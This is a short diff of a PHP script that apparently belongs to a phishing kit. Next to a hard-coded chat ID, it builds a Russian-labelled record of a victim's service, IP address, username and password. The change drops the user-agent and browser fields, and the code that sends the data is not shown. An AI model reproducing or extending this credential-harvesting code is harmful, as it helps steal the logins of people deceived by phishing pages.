@@ -19,8 +19,6 @@ $chat_id = "501357456";
 $arr = array(
   'Сервис: ' => $service,
   'Айпи адресс: ' => $ipaddress,
-  'User Agent: ' => $useragent,
-  'Браузер: ' => $browser, 
   'Имя пользователя: ' => $username,
   'Пароль: ' => $password
 );
